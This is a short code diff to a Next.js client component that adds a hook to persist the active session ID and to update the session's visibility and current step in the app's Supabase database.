@@ -3,6 +3,7 @@
 import { useEffect, useMemo, useRef, useState } from "react";
 import { useRouter } from "next/navigation";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
+import { persistActiveSession } from "@/lib/session-id-client";
 
 type Props = {
   sessionId: string | null;
@@ -49,6 +50,17 @@ export function Banken2Client({ sessionId, routeSessionId, invalid }: Props) {
       setEffectiveSessionId(cached);
     }
   }, [sessionId]);
+
+  useEffect(() => {
+    if (!effectiveSessionId) return;
+    persistActiveSession(effectiveSessionId, routeSessionId);
+    if (supabase) {
+      void supabase
+        .from("sessions")
+        .update({ is_hidden: false, current_step: "banken2" })
+        .eq("id", effectiveSessionId);
+    }
+  }, [effectiveSessionId, routeSessionId, supabase]);
 
   // Tasarim asset'leri (birebir HTML) — bir kez yukle
   useEffect(() => {
